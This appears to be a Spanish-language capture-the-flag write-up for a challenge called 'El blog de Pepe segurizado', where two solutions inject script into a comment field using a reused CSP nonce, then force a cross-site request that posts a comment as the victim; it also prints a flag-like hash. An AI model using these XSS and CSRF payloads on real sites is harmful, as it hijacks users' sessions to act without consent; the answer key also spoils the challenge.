# Desafío 8 - El blog de Pepe segurizado

Desafío 8 - El blog de Pepe segurizado 
 
 
 
txtComentario= 
<script nonce="NDM5OTA="> 
    fetch('/comentarios.php', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', }, 
        
body: 'txtComentario=Voy+a+derogar+la+ley+1542-A&btnEnviar=Enviar' 
}); 
</script>&btnEnviar=Enviar 
 
c4c309a13c8fc4c5f48e72e4154dc812

![Desafío 8 - El blog de Pepe segurizado - imagen 1](images/01.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 2](images/02.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 3](images/03.png)

Solución 2 
</textarea></table> 
<script nonce="NDM5OTA="> 
    // Ejecuta la función cuando el DOM esté listo 
    $(document).ready(function() { 
        // Datos del POST 
        var postData = { 
            txtComentario: "Voy a derogar la ley 1542-A", 
            btnEnviar: "Enviar" 
        }; 
        // Realiza la petición POST de CSRF 
        $.post("/comentarios.php", postData) 
            .done(function(data) { 
                // Opcional: Redirigir a una página limpia para evitar bucles o dejar evidencia 
                window.location.href = "/comentarios.php"; 
            }) 
            .fail(function(xhr, status, error) { 
                // Opcional: Manejar errores 
            }); 
    }); 
</script>

![Desafío 8 - El blog de Pepe segurizado - imagen 4](images/04.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 5](images/05.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 6](images/06.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 7](images/07.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 8](images/08.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 9](images/09.png)

Lo que hace este código es que no para de ejecutar la petición

![Desafío 8 - El blog de Pepe segurizado - imagen 10](images/10.png)

![Desafío 8 - El blog de Pepe segurizado - imagen 11](images/11.png)
